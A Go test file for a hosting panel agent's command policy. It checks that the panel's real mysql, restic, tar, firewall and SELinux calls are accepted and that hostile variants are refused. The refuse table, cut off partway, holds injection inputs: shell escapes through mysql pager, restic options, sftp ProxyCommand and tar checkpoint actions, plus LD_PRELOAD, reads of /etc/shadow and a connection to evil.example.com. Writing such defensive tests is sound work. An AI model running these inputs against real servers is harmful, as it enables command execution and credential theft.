package agent

import (
	"errors"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/sys/unix"

	"monopanel/internal/config"
	"monopanel/internal/osprofile"
)

func init() {
	// TestApplyConfigSetAndRollback validates with true and false: checks of
	// the tests' own, not of the panel's.
	for _, n := range []string{"true", "false"} {
		if p, err := exec.LookPath(n); err == nil {
			extraValidators = append(extraValidators, []string{p})
		}
	}
}

const (
	debian13 = "ID=debian\nVERSION_ID=13\nVERSION_CODENAME=trixie\n"
	alma9    = "ID=almalinux\nID_LIKE=\"rhel centos fedora\"\nVERSION_ID=9.6\n"
	oracle10 = "ID=ol\nID_LIKE=\"fedora\"\nVERSION_ID=10.0\n"
)

// policyServer is an agent whose web root, data and configuration
// directories are temporary ones.
func policyServer(t *testing.T, osRelease string) *Server {
	t.Helper()
	dir := t.TempDir()
	cfg := config.Default()
	cfg.WWWRoot = filepath.Join(dir, "www")
	cfg.DataDir = filepath.Join(dir, "data")
	cfg.ConfigDir = filepath.Join(dir, "etc")
	cfg.SecretKeyFile = filepath.Join(cfg.ConfigDir, "secret.key")
	cfg.LogDir = filepath.Join(dir, "log")
	for _, d := range []string{cfg.WWWRoot, cfg.DataDir, cfg.ConfigDir, cfg.LogDir} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	rel, err := osprofile.ParseOSRelease(strings.NewReader(osRelease))
	if err != nil {
		t.Fatal(err)
	}
	p, err := osprofile.FromRelease(rel)
	if err != nil {
		t.Fatal(err)
	}
	return NewServer(cfg, p, nil)
}

// testAccount is a unix account of the fake account database.
type testAccount struct {
	login, uid, gid, home string
	groups                []string
}

// withAccounts replaces the account database for the test.
func withAccounts(t *testing.T, accounts ...testAccount) {
	t.Helper()
	byLogin := map[string]testAccount{}
	for _, a := range accounts {
		byLogin[a.login] = a
	}
	oldLookup, oldGroups, oldMin := lookupAccount, accountGroups, loginUIDMin
	lookupAccount = func(login string) (*user.User, error) {
		a, ok := byLogin[login]
		if !ok {
			return nil, user.UnknownUserError(login)
		}
		return &user.User{Username: a.login, Uid: a.uid, Gid: a.gid, HomeDir: a.home}, nil
	}
	accountGroups = func(u *user.User) ([]string, error) { return byLogin[u.Username].groups, nil }
	loginUIDMin = func() int { return 1000 }
	t.Cleanup(func() { lookupAccount, accountGroups, loginUIDMin = oldLookup, oldGroups, oldMin })
}

// standardAccounts are the panel's clients and the server's other users.
func standardAccounts(s *Server) []testAccount {
	www := s.cfg.WWWRoot
	return []testAccount{
		{"alex", "1001", "1001", www + "/alex", []string{"alex", sftpGroup}},
		{"bob", "1002", "1002", www + "/bob", []string{"bob", s.cfg.CLIGroup}},
		{"admin", "1000", "1000", "/home/admin", []string{"admin", "sudo"}},
		{"sneaky", "1003", "1003", www + "/sneaky", []string{"sneaky", "docker"}},
		{"daemonish", "999", "999", www + "/daemonish", []string{"daemonish"}},
		{"rootgroup", "1004", "0", www + "/rootgroup", []string{"root"}},
		{"www-data", "33", "33", "/var/www", []string{"www-data"}},
		{"apache", "48", "48", "/usr/share/httpd", []string{"apache"}},
		{"nginx", "990", "990", "/var/lib/nginx", []string{"nginx"}},
		{"postfix", "105", "105", "/var/spool/postfix", []string{"postfix"}},
		{"vmail", "991", "991", mailStore, []string{"vmail"}},
		{"root", "0", "0", "/root", []string{"root"}},
		{"monopanel", "992", "992", s.cfg.DataDir, []string{"monopanel"}},
	}
}

type policyCase struct {
	name string
	call toolCall
}

func tc(mode toolMode, name string, args ...string) toolCall {
	return toolCall{name: name, args: args, mode: mode}
}

func withEnv(c toolCall, env ...string) toolCall {
	c.env = env
	return c
}

func withOutput(c toolCall, p string) toolCall {
	c.outputFile = p
	return c
}

// mustAccept runs the table through the policies; every case must pass.
func mustAccept(t *testing.T, s *Server, cases []policyCase) {
	t.Helper()
	for _, c := range cases {
		call := c.call
		plan, err := s.planTool(&call)
		if err != nil {
			t.Errorf("%s: %s %q refused: %v", c.name, call.name, call.args, err)
			continue
		}
		plan.close()
	}
}

// mustRefuse runs the table through the policies; every case must be
// refused with a 4xx naming why.
func mustRefuse(t *testing.T, s *Server, cases []policyCase) {
	t.Helper()
	for _, c := range cases {
		call := c.call
		plan, err := s.planTool(&call)
		if err == nil {
			plan.close()
			t.Errorf("%s: %s %q must be refused", c.name, call.name, call.args)
			continue
		}
		var ae *Error
		if !errors.As(err, &ae) || ae.Status < 400 || ae.Status >= 500 || ae.Message == "" {
			t.Errorf("%s: want a 4xx refusal, got %#v", c.name, err)
		}
	}
}

func mkdirs(t *testing.T, dirs ...string) {
	t.Helper()
	for _, d := range dirs {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
}

// The calls of internal/api, shape for shape, pass on Debian.
func TestToolPolicyAcceptsThePanelsCallsDebian(t *testing.T) {
	s := policyServer(t, debian13)
	withAccounts(t, standardAccounts(s)...)
	www, data := s.cfg.WWWRoot, s.cfg.DataDir
	home := filepath.Join(www, "alex")
	site := filepath.Join(home, "data", "www", "shop.example.com")
	run := filepath.Join(data, "backups", "tmp", "run-42")
	mkdirs(t, site, run, s.cfg.DownloadsDir())
	archive := filepath.Join(s.cfg.DownloadsDir(), "roundcubemail-1.6.11-complete.tar.gz")
	if err := os.WriteFile(archive, nil, 0o640); err != nil {
		t.Fatal(err)
	}
	repo := []string{"RESTIC_REPOSITORY=/var/backups/monopanel", "RESTIC_PASSWORD=secret", "RESTIC_CACHE_DIR=" + filepath.Join(data, "backups", "cache")}
	s3 := []string{"RESTIC_REPOSITORY=s3:https://s3.amazonaws.com/bucket/monopanel", "RESTIC_PASSWORD=secret", "AWS_ACCESS_KEY_ID=AKIA", "AWS_SECRET_ACCESS_KEY=k"}
	sftp := []string{"RESTIC_REPOSITORY=sftp:backup@203.0.113.7:/srv/restic", "RESTIC_PASSWORD=secret"}
	rest := []string{"RESTIC_REPOSITORY=rest:https://backup.example.com:8000/monopanel", "RESTIC_PASSWORD=secret", "RESTIC_REST_USERNAME=u", "RESTIC_REST_PASSWORD=p"}
	b2 := []string{"RESTIC_REPOSITORY=b2:bucket:monopanel", "RESTIC_PASSWORD=secret", "B2_ACCOUNT_ID=id", "B2_ACCOUNT_KEY=key"}
	sftpURL := []string{"RESTIC_REPOSITORY=sftp://backup@backup.example.com:2222//srv/restic", "RESTIC_PASSWORD=secret"}
	sftpAlias := []string{"RESTIC_REPOSITORY=sftp:backup_box:/srv/restic", "RESTIC_PASSWORD=secret"}
	mustAccept(t, s, []policyCase{
		// ops_db.go mysqlExec, mysqlExecWithPassword; ops_mail_webmail.go mysqlSignsIn
		{"mysqlExec", tc(modeTool, "mysql", "--protocol=socket", "--batch", "--skip-column-names")},
		{"mysqlExecWithPassword", withEnv(tc(modeTool, "mysql", "--protocol=socket", "--batch", "--skip-column-names", "--user=root", "--connect-expired-password"), "MYSQL_PWD=temp:pw")},
		{"mysqlSignsIn", withEnv(tc(modeTool, "mysql", "--protocol=socket", "--batch", "--skip-column-names", "--user=alex_roundcube"), "MYSQL_PWD=pw")},
		// ops_tools.go sphinxQL
		{"sphinxQL", tc(modeTool, "mysql", "--protocol=tcp", "-h127.0.0.1", "-P9306", "--batch", "--skip-column-names", "-e", "SHOW TABLES")},
		// ops_migrate_import.go loadDump
		{"loadDump", tc(modeStreamIn, "mysql", "--protocol=socket", "--binary-mode", "--local-infile=0", "--user=alex_wp", "alex_wp")},
		// ops_backup.go dumps, ops_migrate.go dump stream
		{"backup dump", withOutput(tc(modeTool, "mysqldump", "--protocol=socket", "--single-transaction", "--routines", "--triggers", "--events", "--databases", "alex_wp"), filepath.Join(run, "alex_wp.sql"))},
		{"migrate dump", tc(modeStreamOut, "mysqldump", "--protocol=socket", "--single-transaction", "--routines", "--triggers", "--events", "--set-gtid-purged=OFF", "--databases", "alex_wp")},
		// ops_backup.go restic
		{"snapshots", withEnv(tc(modeTool, "restic", "snapshots", "--json", "--tag", "monopanel"), repo...)},
		{"cat config", withEnv(tc(modeTool, "restic", "cat", "config"), s3...)},
		{"init sftp", withEnv(tc(modeTool, "restic", "init"), sftp...)},
		{"init sftp url", withEnv(tc(modeTool, "restic", "init"), sftpURL...)},
		{"init sftp alias", withEnv(tc(modeTool, "restic", "init"), sftpAlias...)},
		{"init rest", withEnv(tc(modeTool, "restic", "init"), rest...)},
		{"init b2", withEnv(tc(modeTool, "restic", "init"), b2...)},
		{"backup server", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", www, s.cfg.ConfigDir, filepath.Join(data, "certs"), filepath.Join(data, "acme"), filepath.Join(run, "alex_wp.sql"), filepath.Join(run, "panel.db")), repo...)},
		{"backup user", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=user:alex", home), repo...)},
		{"backup site", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=site:shop.example.com", site), repo...)},
		{"backup db", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=db:alex_wp", filepath.Join(run, "alex_wp.sql")), repo...)},
		{"forget", withEnv(tc(modeTool, "restic", "forget", "--prune", "--tag", "monopanel", "--keep-daily", "7", "--keep-weekly", "4", "--keep-monthly", "3"), repo...)},
		{"restore aside", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", filepath.Join(RestoreDir, "1a2b3c4d")), repo...)},
		{"restore aside latest", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", filepath.Join(RestoreDir, "latest"), "--include", "/var/lib/monopanel/certs"), repo...)},
		{"restore in place", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", "/", "--include", home, "--include", filepath.Join(s.cfg.ConfigDir, "templates")), repo...)},
		{"restore web root in place", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", "/", "--include", www), repo...)},
		{"restore configuration in place", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", "/", "--include", s.cfg.ConfigDir), repo...)},
		// the paths of a server snapshot, as the web UI offers them
		{"restore server in place", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", "/", "--include", www, "--include", s.cfg.ConfigDir, "--include", filepath.Join(data, "certs"), "--include", filepath.Join(data, "acme"), "--include", filepath.Join(run, "alex_wp.sql"), "--include", filepath.Join(run, "panel.db")), repo...)},
		// ops_migrate.go files stream, ops_migrate_import.go, cms.go, ops_mail_webmail.go
		{"migrate files out", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--exclude=./data/logs", "--exclude=./data/tmp", "--exclude=./data/.cache", ".")},
		{"migrate files out since", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--exclude=./data/logs", "--newer-mtime=2026-11-20 10:00:00", ".")},
		{"migrate files in", tc(modeStreamIn, "tar", "--extract", "--file", "-", "--directory", home, "--no-same-owner", "--warning=no-timestamp")},
		{"cms tar.gz", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--no-same-owner", "--warning=no-timestamp", "--strip-components=1")},
		{"cms zip", tc(modeStreamIn, "tar", "-xf", "-", "-C", site, "--no-same-owner", "--warning=no-timestamp", "--strip-components=1", "upload")},
		{"cms bitrix", tc(modeStreamIn, "tar", "-xzf", "-", "-C", site, "--no-same-owner", "--warning=no-timestamp")},
		{"webmail", tc(modeTool, "tar", "-xzf", archive, "-C", site, "--strip-components=1", "--no-same-owner")},
		// ops_cron.go, ops_users_delete.go
		{"crontab install", tc(modeTool, "crontab", "-u", "alex", "-")},
		{"crontab remove", tc(modeTool, "crontab", "-r", "-u", "bob")},
		// ops_migrate.go duBytes
		{"du home", tc(modeTool, "du", "-sb", home)},
		// ops_php_ext.go
		{"phpenmod", tc(modeTool, "phpenmod", "-v", "8.3", "imagick")},
		{"phpdismod", tc(modeTool, "phpdismod", "-v", "5.6", "pdo_mysql")},
		// ops_firewall.go, firewalld.go
		{"sshd -T", tc(modeTool, "sshd", "-T")},
		{"nft check", tc(modeTool, "nft", "-c", "-f", "/etc/nftables.d/monopanel.nft")},
		{"nft load", tc(modeTool, "nft", "-f", "/etc/nftables.d/monopanel.nft")},
		{"nft list", tc(modeTool, "nft", "list", "table", "inet", "monopanel")},
		{"nft delete", tc(modeTool, "nft", "delete", "table", "inet", "monopanel")},
		{"fail2ban status", tc(modeTool, "fail2ban-client", "status")},
		{"fail2ban jail", tc(modeTool, "fail2ban-client", "status", "monopanel-nginx-auth")},
		{"fail2ban unban", tc(modeTool, "fail2ban-client", "unban", "203.0.113.7")},
		{"fail2ban unban v6", tc(modeTool, "fail2ban-client", "unban", "2001:db8::7")},
		{"fail2ban unban net", tc(modeTool, "fail2ban-client", "unban", "198.51.100.0/24")},
		{"firewalld state", tc(modeTool, "firewall-cmd", "--state")},
		{"firewalld reload", tc(modeTool, "firewall-cmd", "-q", "--reload")},
		{"firewalld ports", tc(modeTool, "firewall-cmd", "-q", "--permanent", "--add-port=80/tcp", "--add-port=443/tcp")},
		// metrics.go, ops_apps.go
		{"journal", tc(modeTool, "journalctl", "-u", "nginx.service", "-n", "200", "--no-pager", "-o", "short-iso")},
		{"journal app", tc(modeTool, "journalctl", "-u", "monopanel-app-alex-web.service", "-n", "5000", "--no-pager", "-o", "short-iso")},
		{"journal template", tc(modeTool, "journalctl", "-u", "postfix@-.service", "-n", "1", "--no-pager", "-o", "short-iso")},
		// ops_db.go
		{"percona-release", tc(modeTool, "percona-release", "setup", "ps-84-lts")},
		// ops_mail.go, ops_mail_install.go
		{"postmap", tc(modeTool, "postmap", "hash:/etc/postfix/monopanel/virtual_domains")},
		{"postmap lmdb", tc(modeTool, "postmap", "lmdb:/etc/postfix/monopanel/virtual_mailboxes")},
		{"postconf", tc(modeTool, "postconf", "-m")},
		{"newaliases", tc(modeTool, "newaliases")},
	})
}

// The SELinux and dnf calls of internal/api pass on EL.
func TestToolPolicyAcceptsThePanelsCallsEL(t *testing.T) {
	s := policyServer(t, alma9)
	withAccounts(t, standardAccounts(s)...)
	www := s.cfg.WWWRoot
	home := filepath.Join(www, "alex")
	certs := filepath.Join(s.cfg.DataDir, "certs")
	sites := filepath.Join(s.cfg.LogDir, "sites")
	cases := []policyCase{
		{"repolist", tc(modeTool, "dnf", "-q", "repolist", "--all")},
		{"repolist cached", tc(modeTool, "dnf", "-q", "-C", "repolist", "--all")},
		{"crb install", tc(modeTool, "dnf", "-y", "install", "--enablerepo=crb", "postfix", "dovecot", "dovecot-pigeonhole", "opendkim", "opendkim-tools")},
		{"oracle crb", tc(modeTool, "dnf", "-y", "install", "--enablerepo=ol9_codeready_builder", "opendkim")},
		{"setsebool", tc(modeTool, "setsebool", "-P", "httpd_unified=1", "httpd_can_network_connect=1", "httpd_can_network_connect_db=1", "httpd_can_sendmail=1", "httpd_execmem=1", "httpd_setrlimit=1")},
		{"relabel all", tc(modeTool, "restorecon", "-RF", www, s.cfg.RunDir, "/etc/nginx", "/var/log/nginx", sites)},
		{"relabel logs", tc(modeTool, "restorecon", "-R", "-i", sites)},
		{"relabel ssh", tc(modeTool, "restorecon", "-R", "-i", home+"/.ssh", www+"/bob/.ssh")},
		{"relabel tree", tc(modeTool, "restorecon", "-F", "-R", home+"/data/www/shop.example.com")},
		{"relabel site logs", tc(modeTool, "restorecon", "-F", "-R", sites+"/alex")},
		{"relabel mail", tc(modeTool, "restorecon", "-F", "-R", mailStore+"/example.com")},
		{"relabel file", tc(modeTool, "restorecon", "-F", home+"/data/www/x/index.php")},
		{"relabel certs", tc(modeTool, "restorecon", "-RF", certs)},
		{"semodule", tc(modeTool, "semodule", "-i", "/etc/monopanel/selinux/monopanel.cil")},
		{"port", tc(modeTool, "semanage", "port", "-a", "-t", "http_port_t", "-p", "tcp", "2096")},
		{"port modify", tc(modeTool, "semanage", "port", "-m", "-t", "http_port_t", "-p", "tcp", "8443")},
		{"permissive", tc(modeTool, "setenforce", "0")},
		{"enforcing", tc(modeTool, "setenforce", "1")},
		{"avc today", tc(modeTool, "ausearch", "-m", "AVC", "-ts", "today", "--raw")},
		{"avc since", tc(modeTool, "ausearch", "-m", "AVC", "-ts", "11/21/26", "09:15:00", "--raw")},
	}
	// every file context of selinux.go, ops_mail_install.go and ops_valkey.go,
	// added and modified, and in the other spelling of /run
	for spec, label := range map[string]string{
		"/var/www/[^/]+/data/www(/.*)?":         "httpd_sys_content_t",
		"/run/monopanel(/.*)?":                  "httpd_var_run_t",
		"/var/run/monopanel(/.*)?":              "httpd_var_run_t",
		"/var/www/[^/]+/data/logs(/.*)?":        "httpd_log_t",
		`/var/www/[^/]+/\.ssh(/.*)?`:            "ssh_home_t",
		sites + "(/.*)?":                        "httpd_log_t",
		certs + "(/.*)?":                        "cert_t",
		"/run/monopanel-valkey(/.*)?":           "redis_var_run_t",
		"/var/run/monopanel-valkey(/.*)?":       "redis_var_run_t",
		"/var/lib/monopanel-valkey/[^/]+(/.*)?": "redis_var_lib_t",
	} {
		cases = append(cases,
			policyCase{"fcontext " + spec, tc(modeTool, "semanage", "fcontext", "-a", "-t", label, spec)},
			policyCase{"fcontext -m " + spec, tc(modeTool, "semanage", "fcontext", "-m", "-t", label, spec)})
	}
	mustAccept(t, s, cases)
}

// Everything a compromised API could try instead is refused.
func TestToolPolicyRefusesTheRest(t *testing.T) {
	s := policyServer(t, debian13)
	withAccounts(t, standardAccounts(s)...)
	www, data := s.cfg.WWWRoot, s.cfg.DataDir
	home := filepath.Join(www, "alex")
	site := filepath.Join(home, "data", "www", "shop.example.com")
	run := filepath.Join(data, "backups", "tmp", "run-42")
	mkdirs(t, site, run, s.cfg.DownloadsDir())
	// a home whose data directory the account swapped for a symlink
	if err := os.Symlink("/etc", filepath.Join(www, "bob")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/etc", filepath.Join(data, "backups", "tmp", "run-43")); err != nil {
		t.Fatal(err)
	}
	repo := []string{"RESTIC_REPOSITORY=/var/backups/monopanel", "RESTIC_PASSWORD=secret"}
	sock := []string{"--protocol=socket", "--batch", "--skip-column-names"}
	dump := []string{"--protocol=socket", "--single-transaction", "--databases", "alex_wp"}
	mustRefuse(t, s, []policyCase{
		// tools the API does not use, or only the agent itself
		{"bash", tc(modeTool, "bash", "-c", "id")},
		{"php", tc(modeTool, "php", "-r", "system('id');")},
		{"nginx", tc(modeTool, "nginx", "-c", "/tmp/evil.conf")},
		{"apachectl", tc(modeTool, "apachectl", "-f", "/tmp/evil.conf")},
		{"systemctl", tc(modeTool, "systemctl", "start", "debug-shell")},
		{"apt-get", tc(modeTool, "apt-get", "-o", "APT::Update::Pre-Invoke::=sh", "update")},
		{"chpasswd", tc(modeTool, "chpasswd")},
		{"gzip", tc(modeTool, "gzip", "-c", "/etc/shadow")},
		{"mysqladmin", tc(modeTool, "mysqladmin", "shutdown")},
		{"postfix", tc(modeTool, "postfix", "-c", "/tmp", "start")},
		{"doveadm", tc(modeTool, "doveadm", "exec", "sh")},
		{"doveconf", tc(modeTool, "doveconf", "-c", "/tmp/x")},
		{"postsuper", tc(modeTool, "postsuper", "-d", "ALL")},
		{"setquota", tc(modeTool, "setquota", "-u", "root", "0", "0", "0", "0", "/")},
		// mysql
		{"mysql defaults-file", tc(modeTool, "mysql", "--defaults-file=/tmp/my.cnf", "--protocol=socket")},
		{"mysql plugin", tc(modeTool, "mysql", "--protocol=socket", "--plugin-dir=/var/lib/monopanel", "--default-auth=evil")},
		{"mysql pager", tc(modeTool, "mysql", "--protocol=socket", "--pager=sh")},
		{"mysql tee", tc(modeTool, "mysql", "--protocol=socket", "--tee=/etc/cron.d/x")},
		{"mysql local-infile", tc(modeTool, "mysql", "--protocol=socket", "--local-infile=1")},
		{"mysql local-infile prefix", tc(modeTool, "mysql", "--protocol=socket", "--local=1")},
		{"mysql skip binary", tc(modeTool, "mysql", "--protocol=socket", "--skip-binary-mode")},
		{"mysql init-command", tc(modeTool, "mysql", "--protocol=socket", "--init-command=SELECT 1")},
		{"mysql execute over socket", tc(modeTool, "mysql", "--protocol=socket", "-e", "\\! sh")},
		{"mysql execute long", tc(modeTool, "mysql", "--protocol=socket", "--execute=SELECT 1")},
		{"mysql other host", tc(modeTool, "mysql", "--protocol=tcp", "-hevil.example.com", "-P9306", "-e", "SELECT 1")},
		{"mysql other port", tc(modeTool, "mysql", "--protocol=tcp", "-h127.0.0.1", "-P3306", "-e", "SELECT 1")},
		{"mysql tcp stream", tc(modeStreamIn, "mysql", "--protocol=tcp", "-h127.0.0.1", "-P9306", "-e", "SELECT 1")},
		{"mysql no protocol", tc(modeTool, "mysql", "--batch")},
		{"mysql separator", tc(modeTool, "mysql", "--protocol=socket", "--", "--pager=sh")},
		{"mysql bad db", tc(modeStreamIn, "mysql", "--protocol=socket", "--user=alex", "a;b")},
		{"mysql two dbs", tc(modeStreamIn, "mysql", "--protocol=socket", "a", "b")},
		{"mysql bad user", tc(modeTool, "mysql", append(append([]string{}, sock...), "--user=root'@'%")...)},
		{"mysql env", withEnv(tc(modeTool, "mysql", sock...), "LD_PRELOAD=/tmp/x.so")},
		{"mysql host env", withEnv(tc(modeTool, "mysql", sock...), "MYSQL_HOST=evil.example.com")},
		{"mysql out", tc(modeStreamOut, "mysql", sock...)},
		// mysqldump
		{"dump result-file", tc(modeStreamOut, "mysqldump", append(dump, "--result-file=/etc/cron.d/x")...)},
		{"dump tab", tc(modeStreamOut, "mysqldump", append(dump, "--tab=/etc")...)},
		{"dump log-error", tc(modeStreamOut, "mysqldump", append(dump, "--log-error=/etc/x")...)},
		{"dump plugin", tc(modeStreamOut, "mysqldump", append(dump, "--plugin-dir=/tmp", "--default-auth=x")...)},
		{"dump no databases", tc(modeStreamOut, "mysqldump", "--protocol=socket", "alex_wp")},
		{"dump stream in", tc(modeStreamIn, "mysqldump", dump...)},
		{"dump into cron", withOutput(tc(modeTool, "mysqldump", dump...), "/etc/cron.d/x.sql")},
		{"dump unclean", withOutput(tc(modeTool, "mysqldump", dump...), run+"/../../x.sql")},
		{"dump other name", withOutput(tc(modeTool, "mysqldump", dump...), run+"/x.conf")},
		{"dump through symlink", withOutput(tc(modeTool, "mysqldump", dump...), filepath.Join(data, "backups", "tmp", "run-43", "x.sql"))},
		{"output for another tool", withOutput(tc(modeTool, "du", "-sb", home), run+"/x.sql")},
		// restic
		{"restic -o", withEnv(tc(modeTool, "restic", "-o", "sftp.command=sh -c id", "init"), repo...)},
		{"restic option", withEnv(tc(modeTool, "restic", "init", "--option=rclone.program=/tmp/x"), repo...)},
		{"restic password-command", withEnv(tc(modeTool, "restic", "snapshots", "--json", "--tag", "monopanel", "--password-command=sh"), repo...)},
		{"restic backup shadow", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", "/etc/shadow"), repo...)},
		{"restic backup root", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", www, "/root"), repo...)},
		{"restic backup data", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", data), repo...)},
		{"restic backup run file", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", run+"/id_rsa"), repo...)},
		// restic resolves the directories on the way itself: not through a
		// symlink an account or the API left there
		{"restic backup through a home's symlink", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=site:x", filepath.Join(www, "bob", "shadow")), repo...)},
		{"restic backup through a run's symlink", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=db:x", filepath.Join(data, "backups", "tmp", "run-43", "root.sql")), repo...)},
		{"restic backup below certs", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", filepath.Join(data, "certs", "x", "shadow")), repo...)},
		{"restic stdin command", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", "--stdin-from-command", "--", "sh"), repo...)},
		{"restic files-from", withEnv(tc(modeTool, "restic", "backup", "--json", "--tag", "monopanel", "--tag", "scope=server", "--files-from=/etc/x"), repo...)},
		{"restic subfolder", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d:/etc", "--target", "/", "--include", home), repo...)},
		{"restic target etc", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/etc"), repo...)},
		{"restic old target", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", filepath.Join(data, "restore", "latest")), repo...)},
		{"restic other snapshot dir", withEnv(tc(modeTool, "restic", "restore", "1a2b3c4d", "--target", filepath.Join(RestoreDir, "latest")), repo...)},
		{"restic in place all", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/"), repo...)},
		{"restic in place cron", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", "/etc/cron.d"), repo...)},
		{"restic in place glob", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", www+"/*"), repo...)},
		{"restic in place config", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", filepath.Join(s.cfg.ConfigDir, "config.yaml")), repo...)},
		{"restic in place key", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", s.cfg.SecretKeyFile), repo...)},
		{"restic in place data", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", data), repo...)},
		{"restic in place panel db", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", filepath.Join(data, "panel.db")), repo...)},
		{"restic in place downloads", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", s.cfg.DownloadsDir()), repo...)},
		{"restic in place etc", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", "/etc"), repo...)},
		{"restic in place unclean", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", "/", "--include", home+"/../../etc"), repo...)},
		{"restic exclude", withEnv(tc(modeTool, "restic", "restore", "latest", "--target", filepath.Join(RestoreDir, "latest"), "--exclude", "x"), repo...)},
		{"restic forget", withEnv(tc(modeTool, "restic", "forget", "--prune", "--tag", "monopanel", "--keep-daily", "-1", "--keep-weekly", "4", "--keep-monthly", "3"), repo...)},
		{"restic key list", withEnv(tc(modeTool, "restic", "key", "list"), repo...)},
		{"restic dump", withEnv(tc(modeTool, "restic", "dump", "latest", "/etc/shadow"), repo...)},
		{"restic masterkey", withEnv(tc(modeTool, "restic", "cat", "masterkey"), repo...)},
		{"restic self-update", withEnv(tc(modeTool, "restic", "self-update"), repo...)},
		// the agent's own test of restic's sandbox (selfTestRestic), never the API's
		{"restic version", withEnv(tc(modeTool, "restic", "version"), repo...)},
		{"restic password command env", withEnv(tc(modeTool, "restic", "init"), append(repo, "RESTIC_PASSWORD_COMMAND=sh -c id")...)},
		{"restic from password command", withEnv(tc(modeTool, "restic", "init"), append(repo, "RESTIC_FROM_PASSWORD_COMMAND=sh")...)},
		{"restic repository file", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY_FILE=/etc/shadow", "RESTIC_PASSWORD=x")},
		{"restic password file", withEnv(tc(modeTool, "restic", "init"), append(repo, "RESTIC_PASSWORD_FILE=/etc/shadow")...)},
		{"restic rclone env", withEnv(tc(modeTool, "restic", "init"), append(repo, "RCLONE_CONFIG=/tmp/x")...)},
		{"restic preload", withEnv(tc(modeTool, "restic", "init"), append(repo, "LD_PRELOAD=/tmp/x.so")...)},
		{"restic aws profile", withEnv(tc(modeTool, "restic", "init"), append(repo, "AWS_PROFILE=root")...)},
		{"restic aws config", withEnv(tc(modeTool, "restic", "init"), append(repo, "AWS_CONFIG_FILE=/tmp/x")...)},
		{"restic no repo", withEnv(tc(modeTool, "restic", "init"), "RESTIC_PASSWORD=x")},
		{"restic rclone", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=rclone:evil:x", "RESTIC_PASSWORD=x")},
		{"restic sftp option host", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=sftp:-oProxyCommand=id:/x", "RESTIC_PASSWORD=x")},
		{"restic sftp option user", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=sftp:-oProxyCommand=id@host:/x", "RESTIC_PASSWORD=x")},
		{"restic local etc", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=/etc/cron.d", "RESTIC_PASSWORD=x")},
		{"restic local root", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=/", "RESTIC_PASSWORD=x")},
		{"restic local www", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY="+home, "RESTIC_PASSWORD=x")},
		{"restic local relative", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=repo", "RESTIC_PASSWORD=x")},
		{"restic newline", withEnv(tc(modeTool, "restic", "init"), "RESTIC_REPOSITORY=/var/backups/x\nRESTIC_PASSWORD_COMMAND=sh", "RESTIC_PASSWORD=x")},
		{"restic stream", withEnv(tc(modeStreamOut, "restic", "snapshots", "--json", "--tag", "monopanel"), repo...)},
		// tar --create
		{"tar to-command", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--to-command=sh", ".")},
		{"tar checkpoint", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "--checkpoint=1", "--checkpoint-action=exec=sh", ".")},
		{"tar compress program", tc(modeStreamOut, "tar", "--create", "--file", "-", "--directory", home, "--sparse", "--warning=no-file-changed", "--warning=no-file-removed", "-I", "sh", ".")},
